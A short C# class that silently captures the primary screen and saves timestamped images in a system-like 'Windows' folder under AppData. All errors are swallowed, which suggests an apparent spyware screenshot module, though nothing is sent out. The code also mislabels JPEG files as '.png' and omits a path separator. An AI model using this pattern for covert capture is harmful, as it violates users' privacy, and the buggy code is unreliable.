using System.Drawing;
using System;


namespace Screen
{
    class ScreenShot
    {
        public static void Screenshot()
        {
            try
            {
                string Path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows" + @"\ScreenSHOT"; // our path
                Size screenSz = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Size;
                Bitmap screenshot = new Bitmap(screenSz.Width, screenSz.Height);
                Graphics gr = Graphics.FromImage(screenshot);
                gr.CopyFromScreen(Point.Empty, Point.Empty, screenSz);
                string filepath = Path + DateTime.Now.ToString("yyyy.MM.dd HH.mm.ss") + "." + "png"; // giving name for screenshot
                screenshot.Save(filepath, System.Drawing.Imaging.ImageFormat.Jpeg); //saving screenshot
            }
            catch
            {
            }
        }
    }
}
